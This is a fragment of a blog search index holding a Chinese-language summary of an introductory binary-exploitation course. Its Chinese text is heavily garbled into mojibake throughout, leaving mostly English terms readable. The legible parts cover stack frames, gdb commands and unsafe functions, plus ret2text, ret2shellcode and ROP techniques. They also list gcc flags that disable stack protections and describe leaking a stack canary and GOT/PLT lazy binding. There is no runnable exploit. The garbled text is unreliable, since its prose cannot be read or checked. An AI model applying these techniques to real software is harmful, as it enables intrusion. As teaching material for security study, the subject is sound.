å‡½æ•°è¿”å›çš„ç¬¬ä¸€æ­¥å°±æ˜¯å¼¹å‡ºå±€éƒ¨å˜é‡ï¼Œä¾ç„¶å¾ˆç®€å•ï¼š å›¾ 10 \" å›¾ 10 ç¬¬äºŒæ­¥ï¼Œæˆ‘ä»¬è¦å–å‡º caller çš„ ebp å€¼å¹¶èµ‹å€¼ç»™ ebpï¼š å›¾ 11 \" å›¾ 11 è¿™é‡Œå°±å¯ä»¥å¾ˆæ¸…æ™°åœ°çœ‹åˆ°ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ä¸ºä½•è¦ä¿å­˜è¿™ä¸ªå€¼äº†ï¼Œå¦‚æœä¸ä¿å­˜ï¼Œé‚£ä¹ˆè¿”å›çš„æ—¶å€™ ebp ä¸çŸ¥é“åº”è¯¥è¿”å›åˆ°å“ªé‡Œã€‚è€Œä¿å­˜äº† caller çš„ ebp å®é™…ä¸Šå°±æ˜¯ä¿å­˜äº† caller æ ˆå¸§çš„åŸºå€ã€‚ ç¬¬ä¸‰æ­¥å¼¹å‡ºè¿”å›åœ°å€ï¼Œç¬¬å››æ­¥ä¾æ¬¡å¼¹å‡ºå‚æ•°ã€‚ ä¸ºäº†è®©å¤§å®¶èƒ½å¯¹å‡½æ•°è°ƒç”¨æ ˆæœ‰ä¸€ä¸ªæ›´ç›´è§‚çš„è®¤è¯†ï¼Œæˆ‘æ¼”ç¤ºäº† pwnable.kr ä¸Šçš„ random è¿™é¢˜çš„è§£æ³•ï¼Œè€Œä¸ºäº†è§£å†³è¿™é¢˜ï¼Œå°±ä¸å¾—ä¸ç”¨åˆ°è°ƒè¯•å·¥å…· gdbã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:5:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"gdb ç®€ä»‹ è¿™é‡Œä»…ä»…åˆ—å‡ºäº†ä¸€äº›æœ€å¸¸ç”¨çš„ gdb å‘½ä»¤ï¼š b 12 åœ¨ç¬¬ 12 è¡Œä¸‹æ–­ç‚¹ b 1.c:12 åœ¨ 1.c çš„ 12 è¡Œä¸‹æ–­ç‚¹ b main åœ¨ main å‡½æ•°ä¸‹æ–­ç‚¹ b *0x8048abc åœ¨ 0x8048abc åœ°å€å¤„ä¸‹æ–­ç‚¹ r æ‰§è¡Œç¨‹åº c æ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ s å•æ­¥è°ƒè¯•ï¼Œé‡åˆ°å‡½æ•°åˆ™è¿›å…¥ n å•æ­¥è°ƒè¯•ï¼Œé‡åˆ°å‡½æ•°ä¸è¿›å…¥ until è¿è¡Œåˆ°é€€å‡ºå¾ªç¯ until 12 è¿è¡Œåˆ° 12 è¡Œ q é€€å‡º info b æŸ¥çœ‹æ‰€æœ‰æ–­ç‚¹ info func æŸ¥çœ‹æ‰€æœ‰å‡½æ•° p var æ‰“å°å‡º C è¯­è¨€å˜é‡ var çš„å€¼ bt æŸ¥çœ‹å‡½æ•°è°ƒç”¨æ ˆ x/8xw 0x8048abc ä»¥ 16 è¿›åˆ¶æ˜¾ç¤º 0x8048abc åœ°å€å 8 ä¸ªå†…å­˜å•å…ƒçš„å€¼ï¼Œæ¯ä¸ªå†…å­˜å•å…ƒå¤§å° 4 å­—èŠ‚ x/4ch 0x8048abc ä»¥å­—ç¬¦æ ¼å¼æ˜¾ç¤º 0x8048abc åœ°å€å 4 ä¸ªå†…å­˜å•å…ƒçš„å€¼ï¼Œæ¯ä¸ªå†…å­˜å•å…ƒå¤§å° 2 å­—èŠ‚ help x æŸ¥çœ‹å…³äºå‘½ä»¤ x çš„å¸®åŠ© ","date":"2019-12-05","objectID":"/binary-exp/:6:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ç¼“å†²åŒºæº¢å‡ºæ¼æ´â€”â€”æ ˆæº¢å‡º è‡³æ­¤ï¼Œå¯ä»¥ä»‹ç»æ ˆæº¢å‡ºäº†ã€‚æ ˆæº¢å‡ºå³é€šè¿‡è¦†ç›–æ ˆä¸Šçš„æ•°æ®ï¼Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹çš„ä¸€ç§æ”»å‡»æ‰‹æ®µã€‚æ”»å‡»æˆåŠŸè‡³å°‘éœ€è¦ä¸¤ä¸ªå‰æï¼š ç¨‹åºå¿…é¡»å‘æ ˆä¸Šå†™æ•°æ® å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ å…³äºæ ˆæº¢å‡ºï¼Œæœ‰è¿™æ ·ä¸€äº› â€œå±é™©å‡½æ•°â€ æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ï¼š gets scanf read sprintf strcpy strcat ","date":"2019-12-05","objectID":"/binary-exp/:7:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Pwn ç›¸å…³å·¥å…· ä¸ºäº†çœŸæ­£å®æ–½æ”»å‡»ï¼Œä¸€äº›è¾…åŠ©å·¥å…·æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œä¾‹å¦‚ï¼š checksec æ£€æŸ¥ç¨‹åº gdb è°ƒè¯•å¹¶åˆ†æç¨‹åº peda ä¸€ä¸ª gdb çš„å¯è§†åŒ–æ’ä»¶ pwndbg å¦ä¸€ä¸ª gdb çš„å¯è§†åŒ–æ’ä»¶ IDA è‘—åçš„åç¼–è¯‘å·¥å…· pwntools ç”¨äºæ–¹ä¾¿åœ°ç¼–å†™æ”»å‡»è„šæœ¬çš„ python åº“ LibcSearcher ç”¨äºå®æ–½ ret2libc æ”»å‡»çš„ python åº“ ROPgadgets ç”¨äºå®æ–½ ROP æ”»å‡»çš„ python åº“ (netcat) è¿æ¥åˆ°è¿œç¨‹ä¸»æœºä¸Šå¼€æ”¾çš„æœåŠ¡çš„å‘½ä»¤è¡Œå·¥å…· (ssh) ç™»å½•è¿œç¨‹ä¸»æœºçš„å‘½ä»¤è¡Œå·¥å…· ä»‹ç»å®Œäº†è¿™äº›ï¼Œæˆ‘æ¼”ç¤ºäº†å¯¹äº pwnable.kr çš„ bof è¿™é¢˜çš„æ”»å‡»ï¼Œé€šè¿‡æº¢å‡ºå±€éƒ¨å˜é‡æ¥è¦†ç›–å‡½æ•°å‚æ•°çš„å€¼ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:8:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"èŠ±å¼æ ˆæº¢å‡º æ ˆæº¢å‡ºä¹‹æ‰€ä»¥å€¼å¾—å¼€ä¸€é—¨è¯¾æ¥è®²æˆï¼Œæ­£æ˜¯å› ä¸ºè¿™ç§æ”»å‡»æœ‰å¾ˆå¤šç©æ³•ï¼Œä¾‹å¦‚ï¼š Basic ret2text ret2shellcode ret2syscall ret2libc ROP GOT Hijacking Intermediate ret2csu ret2reg BROP Advanced ret2dl_runtime_resolve SROP ret2VDSO JOP COP â€¦ æœ¬è¯¾ç¨‹åªä»‹ç» Basic éƒ¨åˆ†ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:9:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ret2text é¦–å…ˆä»‹ç»äº† ret2textï¼Œå³é€šè¿‡æ ˆæº¢å‡ºè¦†ç›–å‡½æ•°çš„è¿”å›åœ°å€ï¼Œä»¥æ§åˆ¶ç¨‹åºçš„æ§åˆ¶æµã€‚åœ¨ä¾‹é¢˜ bugku çš„ pwn2 ä¸­ï¼Œå°±æ˜¯åˆ©ç”¨ ret2text è¿”å›åˆ°äº† text æ®µå·²ç»å­˜åœ¨çš„ä¸€ä¸ªåé—¨å‡½æ•°æ¥è·å– shellã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:9:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ret2shellcode ä½†ä¸æ˜¯ä»€ä¹ˆæ—¶å€™ç¨‹åºä¸­éƒ½ä¼šæœ‰ä¸€ä¸ªç°æˆçš„åé—¨å‡½æ•°ï¼Œå› æ­¤æœ‰æ—¶æˆ‘ä»¬éœ€è¦è‡ªå·±åˆ›é€ æ¡ä»¶ã€‚ret2shellcode å°±æ˜¯è¿™æ ·çš„æ”»å‡»æ–¹æ³•ã€‚æˆ‘ä»¬å‘æ ˆä¸Šå†™å…¥ä¸€æ®µæ¶æ„çš„æ±‡ç¼–ä»£ç ï¼Œéšååˆ©ç”¨ç¨‹åºä¸­çš„æ¼æ´æ‰§è¡Œæ ˆä¸Šçš„è¿™æ®µä»£ç å³å¯å®Œæˆæ”»å‡»ã€‚Hackergame çš„ ShellHacker è¿™é“é¢˜å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚ ç„¶è€Œä¸Šé¢çš„ä¸¤ç§æ”»å‡»ä¾ç„¶å¤ªè¿‡ç†æƒ³åŒ–äº†ï¼Œç°å®ä¸­çš„ç¨‹åºå¾€å¾€ä¸ä¼šé‚£ä¹ˆå®¹æ˜“è¢«æ ˆæº¢å‡ºæ”»å‡»ï¼Œå› ä¸ºå¼€å¯äº†å„ç§ä¿æŠ¤æªæ–½ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:9:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"æ ˆæº¢å‡ºä¿æŠ¤ è¯¾ç¨‹ä»‹ç»äº† 4 ç§å¸¸è§çš„æ ˆæº¢å‡ºä¿æŠ¤ã€‚å…¶ä¸­ï¼ŒNX ä½¿æ ˆä¸Šçš„æ•°æ®ä¸å¯è¢«æ‰§è¡Œï¼›Canary åœ¨å±€éƒ¨å˜é‡å’Œ callerâ€™s ebp ä¹‹é—´æ’å…¥äº†ä¸€ä¸ªéšæœºå€¼ï¼Œå¹¶åœ¨å‡½æ•°è¿”å›æ—¶æ£€æŸ¥éšæœºå€¼æ˜¯å¦è¢«ä¿®æ”¹ï¼›PIE å°†ä½¿æ•´ä¸ªè¿›ç¨‹ä¸­çš„æ•°æ®åœ°å€å˜å¾—éšæœºï¼Œæ¯æ¬¡è¿è¡Œæ—¶éƒ½ä¸ç›¸åŒï¼›RELRO ä½¿é‡å®šå‘æ®µä¸å¯å†™ã€‚ NX (No eXecution) é»˜è®¤å¼€å¯ Windows: DEP (Data Execution Prevention) gcc â€“z execstack ç¦ç”¨ NX gcc â€“z noexecstack å¯ç”¨ NX Canary é»˜è®¤ä¸å¼€å¯ gcc â€“fno-stack-protector ç¦ç”¨ canary gcc â€“fstack-protector åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ canary gcc â€“fstack-protector-all ä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ canary PIE (Position-Independent Executables) é»˜è®¤ä¸å¼€å¯ Windows: ASLR (Address Space Layout Randomization) Level 0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ– Level 1 - è¡¨ç¤ºå°† mmap çš„åŸºå€ã€æ ˆå’Œ VDSO é¡µé¢éšæœºåŒ– Level 2 - è¡¨ç¤ºåœ¨ 1 çš„åŸºç¡€ä¸Šå¢åŠ å †çš„éšæœºåŒ– gcc â€“fpie â€“pie å¼€å¯ 1 çº§ PIE gcc â€“fPIE â€“pie å¼€å¯ 2 çº§ PIE RELRO (RELocation Read Only) é»˜è®¤ Partial gcc â€“z norelro å…³é—­ RELRO gcc â€“z lazy éƒ¨åˆ†å¼€å¯ RELROï¼ŒGOT è¡¨å¯å†™ gcc â€“z now å…¨éƒ¨å¼€å¯ RELRO è¿™äº›ä¿æŠ¤æœºåˆ¶å¹¶ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“ç»•è¿‡ã€‚ä¸ºäº†çªç ´è¿™äº›ä¿æŠ¤ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ 32 ä½ä¸ 64 ä½æ±‡ç¼–è¯­è¨€çš„çŸ¥è¯†ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:10:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"x86 æ±‡ç¼– æ±‡ç¼–è¯­è¨€æ˜¯ Intel æ¨å‡ºçš„ä¸€ç³»åˆ—æ±‡ç¼–çš„æŒ‡ä»¤é›†åˆï¼Œæœ‰ä¸¤ç§è¯­æ³•ï¼š Intel è¯­æ³•ï¼šoperand destination, source mov eax, 5 AT\u0026T è¯­æ³•ï¼šoperand source, destination mov $5, %eax æœ¬è¯¾ç¨‹å°†ä½¿ç”¨æ›´ç®€å•çš„ Intel è¯­æ³•ï¼ˆCSAPP ä½¿ç”¨ AT\u0026T è¯­æ³•ï¼‰ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:11:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"é‡è¦å¯„å­˜å™¨ eax ebx ecx edx æ³›ç”¨å‹å¯„å­˜å™¨ï¼ˆeax é€šå¸¸å­˜å‚¨å‡½æ•°è¿”å›å€¼ï¼‰ esp æŒ‡å‘æ ˆå¸§é¡¶éƒ¨ ebp æŒ‡å‘æ ˆå¸§åº•éƒ¨ eip æŒ‡å‘ä¸‹ä¸€æ¡ CPU å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤ eflags å­˜å‚¨æ ‡å¿—ä½ ZF è¿ç®—ç»“æœä¸º 0 æ—¶ç½® 1 CF è¿ç®—ç»“æœæœ€é«˜æœ‰æ•ˆä½å‘ç”Ÿè¿›ä½æˆ–å€Ÿä½æ—¶ç½® 1 SF è¿ç®—ç»“æœä¸ºè´Ÿæ—¶ç½® 1 å›¾ 12 \" å›¾ 12 ","date":"2019-12-05","objectID":"/binary-exp/:11:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"æ•°æ®æ“ä½œ mov ebx, eax mov eax, 0XDEADBEEF mov edx, DWORD PTR [0x41424344] mov ecx, DWORD PTR [edx] mov eax, DWORD PTR [ecx+esi*8] sub edx, 0x11 add eax, ebx inc edx dec ebx xor eax, eax or edx, 0x1337 å†™æˆç±»ä¼¼çš„ C ä¼ªä»£ç å³ï¼š ebx = eax; eax = 0xDEADBEEF; edx = *0x41424344; ecx = *edx; eax = *(ecx+esi*8); edx -= 0x11; eax += ebx; edx++; ebx--; eax ^= eax; edx |= 0x1337; è¿™é‡Œçš„ DWORD PTR æŒ‡ 4 å­—èŠ‚æŒ‡é’ˆï¼Œç›¸åº”çš„æœ‰ BYTE PTR/WORD PTR/QWORD PTR è¡¨ç¤º 1/2/8 å­—èŠ‚æŒ‡é’ˆã€‚æ³¨æ„ [0x41424344] è¡¨ç¤ºå–åœ°å€ 0x41424344 ä½ç½®çš„å€¼ï¼Œå¦‚æœé‡Œé¢æ˜¯å¯„å­˜å™¨åŒç†ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:11:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"æ¡ä»¶è·³è½¬ jz $LOC jnz $LOC jg $LOC jle $LOC åˆ†åˆ«è¡¨ç¤ºï¼Œå½“ä¸Šä¸€æ¡è¯­å¥æ‰§è¡Œç»“æœä¸ºï¼š 0 é 0 ç›®æ ‡æ“ä½œæ•°å¤§äºæºæ“ä½œæ•° ç›®æ ‡æ“ä½œæ•°å°äºç­‰äºæºæ“ä½œæ•° æ—¶ï¼Œè·³è½¬åˆ° $LOC çš„ä½ç½®ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:11:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å‡½æ•°è°ƒç”¨ push ebx ; is equal to: sub esp, 4 mov DWORD PTR [esp], ebx pop ebx ; is equal to: mov ebx, DWORD PTR [esp] add esp, 4 call some_function ; is equal to: push eip mov eip, some_function ; actually invalid ret ; is equal to: pop eip ; actually invalid nop ; do nothing ","date":"2019-12-05","objectID":"/binary-exp/:11:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ä¾‹ï¼šè®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ 0x08048624: \"MERCURY\\0\" mov ebx, 0x08048624 mov eax, 0 LOOPY: mov cl, BYTE PTR [ebx] cmp cl, 0 jz end inc eax inc ebx jmp LOOPY end: ret ç­‰æ•ˆäºä¸‹é¢çš„ C ä»£ç ï¼š char *name = \"MERCURY\"; int len = 0; while (*name != 0) { len++; name++; } return len; ","date":"2019-12-05","objectID":"/binary-exp/:11:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"x86-64 æ±‡ç¼– å†æ”¾ä¸€æ¬¡è¿™å¼ å›¾ã€‚ å›¾ 13 \" å›¾ 13 64 ä½æ¶æ„ä¸‹ï¼Œæ–°å¢äº†å¯„å­˜å™¨ r8-r15ï¼Œç”¨ xmm0-xmm7 å­˜å‚¨æµ®ç‚¹å‚æ•°ï¼ŒåŒæ—¶åŸæ¥çš„ eax å˜æˆäº† rax ç­‰ã€‚ä½†æœ€é‡è¦çš„ï¼Œè¿˜æ˜¯ä¼ å‚æ–¹å¼çš„å˜åŒ–ï¼šå‡½æ•°å‰ 6 ä¸ªå‚æ•°ä¼šè¢«ä¾æ¬¡å­˜å‚¨åœ¨å¯„å­˜å™¨ rdi, rsi, rdx, rcx, r8, r9 ä¸­ï¼Œä¹‹åçš„å‚æ•°æ‰éµå¾ªæ ˆä¸Šçº¦å®šã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:12:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"èŠ±å¼æ ˆæº¢å‡ºï¼šç»­ ","date":"2019-12-05","objectID":"/binary-exp/:13:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"æ³„éœ² canary ä»‹ç»äº†è¿™ä¹ˆå¤šï¼Œç»ˆäºå¯ä»¥æ¼”ç¤ºä¸€äº›ä¿æŠ¤æœºåˆ¶çš„ç»•è¿‡æ–¹æ³•äº†ï¼Œé¦–å…ˆæ˜¯ç»•è¿‡ canaryï¼Œè¿™é‡Œé‡‡ç”¨äº†æ³„éœ² canary çš„æ–¹å¼ï¼Œå®é™…ä¸Šè¿˜æœ‰å¾ˆå¤šå…¶ä»–æ–¹å¼ã€‚å‰é¢æåˆ°è¿‡ï¼Œcanary åœ¨æ ˆä¸Šå¤§æ¦‚åœ¨è¿™ä¸ªä½ç½®ï¼š | args | ------------ | ret addr | ------------ \u003c- ebp | saved ebp | ------------ | padding | ------------ \u003c- ebp-0x?? | canary | ------------ | local vars | é‚£ä¹ˆæˆ‘ä»¬æ ˆæº¢å‡ºæ—¶ï¼Œä»å±€éƒ¨å˜é‡å‡ºå‘å‘ä¸Šèµ°ï¼Œå¿…å®šè¦ç»è¿‡ canary å¹¶è¦†ç›–å…¶å€¼ï¼Œé‚£ä¹ˆå‡½æ•°è¿”å›æ—¶å°±ä¼šæ£€æµ‹åˆ°ï¼Œå¹¶ç»ˆæ­¢ç¨‹åºã€‚ ç„¶è€Œï¼Œcanary åœ¨è®¾è®¡æ—¶è§„å®šæœ«å°¾çš„å­—èŠ‚å¿…ä¸º 00ï¼Œä¹Ÿå°±æ˜¯ C è¯­è¨€ä¸­çš„ \\0ï¼Œè¿™æ˜¯å› ä¸ºå½“æˆ‘ä»¬æ‰“å°æ ˆä¿¡æ¯æ—¶ï¼ˆä»ä½åœ°å€å‘é«˜åœ°å€æ‰“å°ï¼‰ï¼Œé‡åˆ° 00 å­—èŠ‚å°±ä¼šè®¤ä¸ºæ˜¯å­—ç¬¦ä¸²ç»“æŸç¬¦ï¼Œå› æ­¤åœæ­¢æ‰“å°ï¼Œè¿™æ · canary çš„å€¼å°±ä¸ä¼šæ³„éœ²ã€‚ç„¶è€Œè¿™åŒæ—¶ä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚å¦‚æœæˆ‘ä»¬è¦†ç›–æ‰ canary çš„æœ€åä¸€ä¸ªå­—èŠ‚ä¸º 0a æˆ–è€…åˆ«çš„ä»€ä¹ˆå€¼ï¼Œé‚£ä¹ˆæ‰“å°æ ˆæ—¶å°±ä¸ä¼šåœ¨ canary å¤„åœä¸‹æ¥ï¼Œä»è€Œæ‰“å°å‡º canary çš„å€¼ã€‚è¿™æ˜¯æˆ‘ä»¬å†å°† 0a æ¢å¤ä¸º 00 ä¾¿å¾—åˆ°äº†å®Œæ•´çš„ canary å€¼ã€‚ å¾—åˆ° canary åï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æ ˆæº¢å‡ºæ—¶æ³¨æ„ï¼Œæº¢å‡ºåˆ° canary çš„ä½ç½®çš„æ—¶å€™æ’å…¥åˆšæ‰å¾—åˆ°çš„ canary å€¼ï¼Œéšåç»§ç»­æ­£å¸¸æº¢å‡ºï¼Œé‚£ä¹ˆå‡½æ•°è¿”å›æ—¶å°±ä¼šè®¤ä¸º canary æœªè¢«ä¿®æ”¹ï¼Œç»•è¿‡äº†æ£€æŸ¥ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:13:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"GOT \u0026 PLT ä¸ºäº†æ›´å¥½åœ°ç†è§£æ¥ä¸‹æ¥çš„æ”»å‡»æŠ€æœ¯ï¼Œè¿™é‡Œä¸»è¦ä»‹ç»äº† Linux ä¸­å‡½æ•°è°ƒç”¨æ—¶çš„å»¶è¿Ÿç»‘å®šè§„åˆ™ï¼Œè¿™å°±æ¶‰åŠåˆ° ELF æ–‡ä»¶ä¸­çš„ä¸¤ä¸ªæ®µï¼š.plt æ®µä¸ .got.plt æ®µï¼ˆå®é™…ä¸Šï¼ŒGOT è¡¨è¢«åˆ†æˆ .got ä¸ .got.plt ä¸¤ä¸ªæ®µï¼Œå‰è€…ä¸å‡½æ•°æ— å…³ï¼‰ï¼Œåˆ†åˆ«å¯¹åº”æˆ‘ä»¬çš„ Procedure Linkage Table å’Œ Global Offset Tableã€‚æ‰€è°“å»¶è¿Ÿç»‘å®šï¼Œå³ä¸€ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ç›´åˆ°å…¶ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨æ—¶æ‰ä¼šç¡®å®šã€‚ æˆ‘ä»¬ä»¥ Hello World ç¨‹åºçš„ puts å‡½æ•°è°ƒç”¨ä¸ºä¾‹ï¼Œè°ƒç”¨è¯­å¥æ˜¯ call \u003cputs@plt\u003eã€‚æˆ‘ä»¬å‡è®¾ .plt ç»“æ„å¦‚ä¸‹ï¼š å›¾ 14 \" å›¾ 14 ç§° .plt å¼€å¤´çš„ä¸‰æ¡æŒ‡ä»¤ä¸º .plt[0]ï¼Œputs çš„ PLT è¡¨æ˜¯ .plt[1]ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡è°ƒç”¨ puts æ—¶ä¼šè®¿é—® puts@plt ä¹Ÿå°±æ˜¯ .plt[1]ã€‚.plt[1] ä¼šè·³è½¬åˆ° puts å¯¹åº”çš„ GOT è¡¨æ¡ç›® .got.plt[3]ã€‚ä¸ºä»€ä¹ˆä¸‹æ ‡æ˜¯ 3ï¼Ÿè¿™æ˜¯å› ä¸º .got.plt æ®µæ˜¯é•¿è¿™æ ·çš„ï¼š å›¾ 15 \" å›¾ 15 å¯ä»¥çœ‹åˆ°ï¼Œ.got.plt çš„å‰ä¸‰æ¡æŒ‡ä»¤ä¸å±äºä»»ä½•å‡½æ•°ï¼Œä»–ä»¬åˆ†åˆ«å­˜å‚¨ç€ï¼š .dynamic åŠ¨æ€é“¾æ¥ä¿¡æ¯ æ¨¡å— ID åŠ¨æ€é“¾æ¥å™¨ä¸­çš„ dl_runtime_resolve_avx() å‡½æ•°åœ°å€ äºæ˜¯ puts çš„ GOT è¡¨é¡¹å°±è¢«æŒ¤åˆ°ä¸‹æ ‡ä¸º 3 çš„åœ°æ–¹å»äº†ã€‚ åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨å‰ï¼Œ.got.plt[3] æŒ‡å‘ .plt[1] çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ç›´æ¥è®© .plt[1] ç»§ç»­æ‰§è¡Œä¸‹å»ï¼Œå°±å¥½åƒå®ƒæ²¡æœ‰è®¿é—®è¿‡ .got.plt[3] ä¸€æ ·ã€‚ éšåï¼Œæˆ‘ä»¬çš„ .plt[1] çš„ç¬¬äºŒæ¡æŒ‡ä»¤ä¼šè·³è½¬åˆ° .plt[0]ï¼Œåè€…å†è·³è½¬åˆ° .got.plt[2]ï¼Œä¹Ÿå°±æ˜¯ dl_runtime_resolve_avx() 